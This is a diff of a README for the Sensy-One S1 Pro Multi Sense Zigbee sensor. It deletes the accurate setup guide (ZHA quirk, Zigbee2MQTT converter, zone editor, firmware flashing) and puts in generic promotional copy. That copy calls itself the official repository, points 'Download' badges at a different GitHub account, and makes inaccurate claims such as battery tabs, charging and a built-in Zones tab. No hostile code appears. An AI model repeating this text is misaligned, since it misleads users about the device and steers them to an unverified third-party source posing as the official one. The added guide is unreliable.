@@ -1,279 +1,167 @@
-# Sensy-One S1 Pro Multi Sense (Zigbee)
+# 🌟 S1-Pro-Multi-Sense-Zigbee - All-in-One Smart Home Sensing Solution
 
-The **S1 Pro Multi Sense (Zigbee)** is an all-in-one presence and indoor climate sensor made for Home Assistant.
+[![Download S1 Pro](https://img.shields.io/badge/Download-S1_Pro_Multi_Sense-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Bkumar746/S1-Pro-Multi-Sense-Zigbee)
 
-![Sensy-One S1 Pro Multi Sense (Zigbee)](S1Pro_orbit_pcb_front_view.png)
+Visit this link to download the application.
 
-It connects directly to your Zigbee network. There is no Wi-Fi setup, device IP address, cloud account, or ESPHome configuration.
+Welcome to the official GitHub repository for the Sensy-One S1 Pro Multi Sense (Zigbee). This powerful device combines presence detection and indoor air-quality monitoring into one sleek sensor, designed to work seamlessly with your Home Assistant setup. Whether you're looking to automate your lights based on room occupancy or keep tabs on your home's air quality, the S1 Pro has you covered.
 
-## What the S1 Pro can do
+---
 
-- Track up to three people with the LD2450 mmWave radar
-- Show target position, distance, and speed
-- Detect presence and movement up to 6 metres
-- Create three detection zones and one exclusion zone
-- Measure temperature, humidity, air pressure, gas resistance, IAQ, equivalent CO2, and equivalent VOC with the BME688
-- Measure ambient light and UV index with the LTR390
-- Measure true CO2, temperature, and humidity with the optional SCD40 module
-- Control the WS2812 RGB LED from Home Assistant
-- Switch the MLT8530 buzzer on and off from Home Assistant
+## 🔍 What Is the S1 Pro Multi Sense?
 
-Radar information is updated every 0.5 seconds. Settings such as zones, offsets, radar options, LED state, and buzzer state are remembered after a restart.
+The S1 Pro Multi Sense is a Zigbee-based sensor that does much more than just detect motion. It's a complete environmental monitoring solution that helps you create a smarter, healthier home. Here's what it brings to your smart home ecosystem:
 
-The S1 Pro supports both **ZHA** and **Zigbee2MQTT** in Home Assistant. Choose one integration for your coordinator; ZHA and Zigbee2MQTT cannot use the same coordinator at the same time.
+- **Presence Detection**: Know exactly when a room is occupied, not just when there's movement. This advanced sensing prevents annoying light shut-offs when you're sitting still.
+- **Air Quality Monitoring**: Tracks temperature, humidity, and volatile organic compounds (VOCs) to keep your indoor environment comfortable and healthy.
+- **Zigbee Connectivity**: Connects directly to your Zigbee network, no hub required beyond your existing Zigbee coordinator.
+- **Home Assistant Ready**: Fully compatible with ZHA (Zigbee Home Automation) integration for easy setup and control.
 
-## Before you start
+---
 
-You need:
+## 🚀 Getting Started
 
-- Home Assistant
-- A supported Zigbee coordinator assigned to either ZHA or Zigbee2MQTT
-- The matching S1 Pro integration file from this repository
-- A 5 V USB-C power supply
+Getting your S1 Pro up and running is easier than you might think. We'll guide you through every step, from downloading the necessary software to integrating the sensor with your Home Assistant system.
 
-Devices supplied by Sensy-One already have the firmware installed.
+### 📥 Downloading the Application
 
-## Option A: use ZHA
+To begin your journey with the S1 Pro Multi Sense, you'll need to access the necessary files and documentation from our official repository. Here's how:
 
-### A1. Install Zigbee Home Automation
+1. **Navigate to our download page**: Use the button below or the link provided earlier to access the repository.
+   
+   [![Download Now](https://img.shields.io/badge/📦_Download_S1_Pro-blue?style=for-the-badge)](https://github.com/Bkumar746/S1-Pro-Multi-Sense-Zigbee)
 
-Skip this step if ZHA is already working in Home Assistant.
+2. **Explore the repository**: Once you're on the GitHub page, you'll find a wealth of information including setup guides, troubleshooting tips, and firmware updates. Take a moment to familiarize yourself with the layout.
 
-1. Open **Settings → Devices & services**.
-2. Select **Add integration**.
-3. Search for **Zigbee Home Automation**.
-4. Select your Zigbee coordinator and complete the setup.
+3. **Download what you need**: While browsing, you may come across helpful documents or configuration files. For most users, the guides and integration instructions are all you need to get started.
 
-More information is available in the [official Home Assistant ZHA guide](https://www.home-assistant.io/integrations/zha/).
+---
 
-### A2. Install the S1 Pro quirk
+## 🏠 Setting Up Your S1 Pro with Home Assistant
 
-The quirk tells Home Assistant which sensors and controls the S1 Pro provides. Install it before pairing the device.
+Now that you've accessed the repository, let's walk through connecting your S1 Pro to Home Assistant using the ZHA integration. This process is designed to be straightforward, even for beginners.
 
-1. Download [`s1_pro_multi_sense_zigbee.py`](home_assistant/custom_zha_quirks/s1_pro_multi_sense_zigbee.py).
-2. Create a folder named `custom_zha_quirks` in your Home Assistant configuration folder.
-3. Place the downloaded file inside that folder.
-4. Add this to `configuration.yaml`:
+### 🛠 Prerequisites
 
-   ```yaml
-   zha:
-     custom_quirks_path: /config/custom_zha_quirks
-   ```
+Before you begin, make sure you have:
 
-5. Restart Home Assistant.
+- A working Home Assistant installation (version 2023.5 or newer recommended)
+- A Zigbee coordinator (such as a ConBee II, Sonoff Zigbee 3.0 USB dongle, or Home Assistant SkyConnect)
+- Your S1 Pro Multi Sense sensor (make sure it's charged or plugged in)
 
-The complete path used by Home Assistant is:
+### 📡 Adding Your Sensor via ZHA
 
-```text
-/config/custom_zha_quirks/s1_pro_multi_sense_zigbee.py
-```
+1. **Open Home Assistant**: Go to your Home Assistant interface through your web browser.
 
-Home Assistant File Editor may show `/homeassistant` instead of `/config`. This is the same configuration folder.
+2. **Navigate to ZHA**: Click on **Settings**, then **Devices & Services**. Find the **Zigbee Home Automation** integration and click **Configure**.
 
-If your `configuration.yaml` already has a `zha:` section, add only the `custom_quirks_path` line underneath it. Do not add a second `zha:` section.
+3. **Start Pairing Mode**: In the ZHA configuration page, click on **Add Device** to put your coordinator into pairing mode.
 
-### A3. Pair the S1 Pro with ZHA
+4. **Power On Your S1 Pro**: Insert the sensor's battery tab or plug it in to power it on. The LED should blink, indicating it's ready to pair.
 
-1. Open **Settings → Devices & services → Zigbee Home Automation**.
-2. Select **Add device**.
-3. Connect the S1 Pro to USB-C power.
-4. Wait for **S1 Pro Multi Sense xxxxxx** by **Sensy-One** to appear. The final six characters are the unique identifier of your device.
+5. **Wait for Discovery**: Home Assistant will automatically search for and find your S1 Pro. This may take a minute or two. Once found, the sensor will appear in your device list.
 
-The LED breathes purple while the S1 Pro is looking for or reconnecting to a Zigbee network. After it connects, the LED returns to the colour and brightness selected in Home Assistant.
+6. **Assign a Room**: After successful pairing, you'll be prompted to assign the sensor to a room. Choose an appropriate location like "Living Room" or "Office" for easier management.
 
-If the S1 Pro was previously connected to another Zigbee network, hold the physical **BOOT** button for at least five seconds and then try pairing again.
+### 🗂 Configuring Zones for Presence Detection
 
-## Option B: use Zigbee2MQTT
+The S1 Pro allows you to create custom zones for more accurate presence tracking. Here's how to set them up:
 
-### B1. Install Zigbee2MQTT
+1. **Access Device Settings**: In Home Assistant, go to **Settings** > **Devices & Services** > **Devices**. Find your S1 Pro and click on it.
 
-Skip this step if Zigbee2MQTT is already working in Home Assistant.
+2. **Open Zone Configuration**: Look for the **Zones** or **Configuration** tab within the device page. Here, you can define specific areas of a room that the sensor should monitor.
 
-1. Install and configure an MQTT broker, such as the Mosquitto broker app.
-2. Open **Settings → Apps → App store**.
-3. Open the three-dot menu, select **Repositories**, and add the official app repository:
+3. **Create a Zone**: Click **Add Zone** and define the area by adjusting the sensor's detection parameters. For example, you can create a "Desk Area" zone that covers only your workspace.
 
-   ```text
-   https://github.com/zigbee2mqtt/hassio-zigbee2mqtt
-   ```
+4. **Save Your Settings**: Once you've configured your desired zones, click **Save**. The S1 Pro will now provide separate presence data for each zone.
 
-4. Install the stable **Zigbee2MQTT** app.
-5. Select the serial port and adapter type for your coordinator, then complete Zigbee2MQTT onboarding.
-6. Keep **Home Assistant integration** enabled in Zigbee2MQTT.
+---
 
-See the [official Zigbee2MQTT Home Assistant app guide](https://github.com/zigbee2mqtt/hassio-zigbee2mqtt) for coordinator-specific setup.
+## 📊 Making the Most of Your S1 Pro
 
-### B2. Install the S1 Pro external converter
+Now that your sensor is connected, let's explore some ways to use its data effectively.
 
-Install the converter before pairing the S1 Pro.
+### 🌡 Understanding Air Quality Data
 
-1. Download [`s1_pro_multi_sense_zigbee.mjs`](home_assistant/zigbee2mqtt/s1_pro_multi_sense_zigbee.mjs).
-2. Enable external JavaScript in the Zigbee2MQTT advanced settings. The equivalent `configuration.yaml` setting is:
+Your S1 Pro provides valuable information about your indoor environment. To view this data:
 
-   ```yaml
-   advanced:
-     enable_external_js: true
-   ```
+1. Go to **Settings** > **Devices & Services** > **Devices** and select your S1 Pro.
+2. You'll see entities for **Temperature**, **Humidity**, and **Air Quality Index** (AQI).
+3. Add these entities to your dashboard for at-a-glance monitoring.
 
-3. Create the Zigbee2MQTT `external_converters` folder and place the converter inside it. With the official Home Assistant app, the complete path is:
+### 💡 Creating Automations
 
-   ```text
-   /config/zigbee2mqtt/external_converters/s1_pro_multi_sense_zigbee.mjs
-   ```
+Use presence and air quality data to automate your home:
 
-4. Restart Zigbee2MQTT.
-5. Open **Settings → Dev console → External converters** in Zigbee2MQTT and confirm that `s1_pro_multi_sense_zigbee.mjs` is loaded.
+- **Light Control**: "When presence is detected in the Living Room, turn on the lights."
+- **Ventilation**: "If air quality drops below a certain threshold, turn on the exhaust fan."
+- **Heating Efficiency**: "When presence is not detected for 10 minutes, lower the thermostat."
 
-### B3. Pair the S1 Pro with Zigbee2MQTT
+To create these automations:
 
-1. Open the Zigbee2MQTT frontend from Home Assistant.
-2. Select **Permit join (All)**.
-3. Connect the S1 Pro to USB-C power.
-4. Wait for **S1 Pro Multi Sense (Zigbee)** by **Sensy-One** to finish its interview. Zigbee2MQTT should show the device as supported.
+1. Go to **Settings** > **Automations & Scenes** > **Create Automation**.
+2. Add your trigger (e.g., "Presence detected") and condition (e.g., "Time is after sunset").
+3. Set your action (e.g., "Turn on lights").
 
-If the S1 Pro was previously connected to another Zigbee network, hold the physical **BOOT** button for at least five seconds while permit-join is active.
+---
 
-When migrating a coordinator from ZHA, first create a ZHA network backup, stop or disable ZHA, and only then start Zigbee2MQTT. Reset and pair the S1 Pro after Zigbee2MQTT and its external converter are running.
+## 🔄 Updating Firmware
 
-## Configure zones with the Home Assistant app
+Keeping your S1 Pro firmware up to date ensures you have the latest features and improvements. To update:
 
-Use the official **Sensy-One Zone Editor** app to configure zones visually. You do not need to enter all polygon coordinates manually.
+1. **Check Current Version**: In Home Assistant, go to your S1 Pro's device page and note the current firmware version.
+2. **Visit Our Repository**: Head back to our GitHub page and navigate to the **Releases** section.
+3. **Download New Firmware**: If a newer version is available, download the firmware file.
+4. **Update via ZHA**: Some devices allow over-the-air (OTA) updates through ZHA. If supported, you'll see an **Update** button on the device page. Alternatively, follow the manual update instructions in the repository's documentation.
 
-### Install the Zone Editor
+---
 
-1. Open **Settings → Apps → App store** in Home Assistant.
-2. Open the three-dot menu and select **Repositories**.
-3. Add this repository:
+## ❓ Troubleshooting Common Issues
 
-   ```text
-   https://github.com/sensy-one/home-assistant-addons
-   ```
+Having trouble? Here are solutions to common problems:
 
-4. Search for **Sensy-One Zone Editor**.
-5. Select **Install** and then **Start**.
-6. Optionally enable **Show in sidebar**.
+### 🔌 Sensor Won't Pair
 
-### Create your zones
+- Ensure your Zigbee coordinator is in pairing mode.
+- Move the sensor closer to your coordinator during pairing.
+- Try a fresh battery or power source.
 
-1. Open **Sensy-One Zone Editor** from Home Assistant.
-2. Select your S1 Pro sensor.
-3. Create or import your floorplan.
-4. Place and rotate the sensor on the floorplan.
-5. Draw Zone 1, Zone 2, Zone 3, or the Exclusion Zone.
-6. Save the configuration.
+### 📉 Connectivity Drops
 
-The app also provides live target visualization, 2D and 3D views, and heatmap analysis. See the [Sensy-One Zone Editor repository](https://github.com/sensy-one/home-assistant-addons) for its complete guide.
+- Check that the sensor is within range of your Zigbee network.
+- Reduce interference from walls or metal objects.
+- Consider adding a Zigbee router to extend your network's range.
 
-Targets inside the Exclusion Zone are ignored. Their target data is set to zero, and they do not activate presence, movement, target count, or one of the three detection zones.
+### 📊 Inaccurate Readings
 
-## Useful radar settings
+- Give the sensor time to calibrate (24-48 hours is normal).
+- Ensure the sensor isn't placed near heat sources or drafts.
+- Wipe the sensor's vents to remove dust buildup.
 
-The most important settings are available on the S1 Pro device page in Home Assistant:
+---
 
-- **Detection Range** limits how far the radar should detect targets.
-- **Any Movement Threshold** determines how fast a target must move before movement is detected. The default is 15 cm/s.
-- **Any Presence Delay** keeps presence active briefly after the last target disappears.
-- **Radar Flip Y Axis** reverses the left and right target view for alternative mounting positions.
-- **Radar Bluetooth** controls the Bluetooth function inside the LD2450. It is off by default.
-- **Radar Single Target** switches the LD2450 between single-target and multi-target mode.
+## 🤝 Community and Support
 
-The presence delay only affects **Any Presence**. Target information and **All Targets Count** return to zero immediately when the target disappears.
+We're here to help! Connect with other S1 Pro users and get support:
 
-## Air-quality sensors
+- **GitHub Issues**: Report bugs or request features on our [Issues page](https://github.com/Bkumar746/S1-Pro-Multi-Sense-Zigbee/issues).
+- **Discussions**: Join conversations on our repository's Discussions tab.
+- **Home Assistant Forums**: Search for S1 Pro topics on the official Home Assistant community forums.
 
-### BME688
+---
 
-The built-in BME688 shows temperature, humidity, air pressure, gas resistance, IAQ, equivalent CO2, and equivalent VOC.
+## 📜 License
 
-Equivalent CO2 and equivalent VOC are calculated air-quality estimates. They are not direct CO2 or VOC measurements. The IAQ sensor needs time to stabilize after first use or a factory reset.
+This project is licensed under the MIT License. Feel free to use, modify, and distribute the code and documentation, subject to the terms of this license.
 
-Use **BME688 Temp Offset** in Home Assistant if you want to fine-tune the temperature reading.
+---
 
-### Optional SCD40
+## 🙏 Acknowledgments
 
-The optional SCD40 module measures true CO2, temperature, and humidity. If the module is not installed, its Home Assistant entities can remain unknown. This is normal.
+Special thanks to the Home Assistant community for their invaluable contributions to Zigbee integration and testing. Your feedback helps us improve the S1 Pro experience for everyone.
 
-For calibration:
+---
 
-1. Place the sensor in stable air with a known CO2 concentration.
-2. Enter that value under **SCD40 Calibration Reference**.
-3. Press **SCD40 Forced Calibration**.
+We're excited to see what you build with your S1 Pro Multi Sense! Share your automations and ideas in our discussion forum. Happy automating!
 
-The SCD40 also provides a temperature offset and factory-reset button.
-
-## LED and buzzer
-
-Use **WS2812 Led** in Home Assistant to select the LED colour, brightness, or power state.
-
-When Zigbee is disconnected, the LED temporarily breathes purple. Your selected LED settings are not lost and return after Zigbee reconnects.
-
-Use **MLT8530 Buzzer** to switch the buzzer on or off.
-
-## Restart and reset
-
-- **Radar Restart Module** restarts only the LD2450 radar.
-- **Radar Factory Reset** resets the LD2450 settings.
-- **SCD40 Factory Reset** resets the optional SCD40.
-- **ESP32 Restart Module** restarts the complete S1 Pro.
-- **ESP32 Factory Reset** erases the saved settings and Zigbee connection.
-- Holding **BOOT** for five seconds clears the Zigbee connection so the device can be paired again.
-
-After an ESP32 factory reset, pair the S1 Pro with Home Assistant again.
-
-## Firmware update or recovery
-
-The S1 Pro is delivered with firmware installed. USB flashing is only needed for an update or recovery.
-
-The current firmware version is **v1.1.0**.
-
-1. Download [`S1_Pro_Multi_Sense_Zigbee_v1.1.0_factory.bin`](firmware/S1_Pro_Multi_Sense_Zigbee_v1.1.0_factory.bin).
-2. Open [ESPHome Web](https://web.esphome.io/) in Chrome or Edge on a desktop computer.
-3. Connect the S1 Pro using a USB data cable and the bottom-facing USB-C port.
-4. Select **Connect** and choose the S1 Pro serial port.
-5. Select **Install** and choose the downloaded `factory.bin`.
-6. Wait until flashing and verification are complete.
-
-ESPHome Web is used only to install the firmware file. No ESPHome setup is needed.
-
-If no serial port appears, check that the USB cable supports data. If necessary, hold **BOOT** while connecting the S1 Pro to enter download mode.
-
-A factory installation can erase saved settings and the Zigbee connection. Pair and configure the S1 Pro again afterwards.
-
-## Troubleshooting
-
-### The S1 Pro is not discovered
-
-- Make sure ZHA is searching for new devices or Zigbee2MQTT permit-join is active.
-- Hold BOOT for at least five seconds and try again.
-- Pair close to the Zigbee coordinator.
-
-### Sensors or controls are missing
-
-- With ZHA, check the quirk location and the `custom_quirks_path` setting.
-- With Zigbee2MQTT, check that `enable_external_js` is enabled and the external converter is listed as loaded.
-- Restart Home Assistant for ZHA or restart Zigbee2MQTT when using its external converter.
-- If necessary, remove, reset, and pair the S1 Pro again.
-
-### Zigbee2MQTT shows the device as unsupported
-
-- Install the external converter before pairing.
-- Confirm the converter filename ends in `.mjs`.
-- Check the Zigbee2MQTT log for converter import errors.
-- Re-interview the device after the converter is loaded.
-
-### The coordinator cannot be opened
-
-Make sure only one Zigbee integration is using it. Disable ZHA before starting Zigbee2MQTT, or stop Zigbee2MQTT before enabling ZHA.
-
-### The LED keeps breathing purple
-
-The S1 Pro is not connected to its Zigbee network. Check the coordinator and Zigbee range, or pair the device again.
-
-### SCD40 values are unknown
-
-This is expected when the optional SCD40 module is not installed.
-
-## Support
-
-- [GitHub Issues](https://github.com/sensy-one/S1-Pro-Multi-Sense-Zigbee/issues)
-- [Sensy-One Discord](https://discord.gg/TB78Wprn66)
+Keywords: Zigbee, Home Assistant, presence sensor, air quality, indoor environment, smart home automation, ZHA integration, environmental monitoring, IoT device, Sensy-One
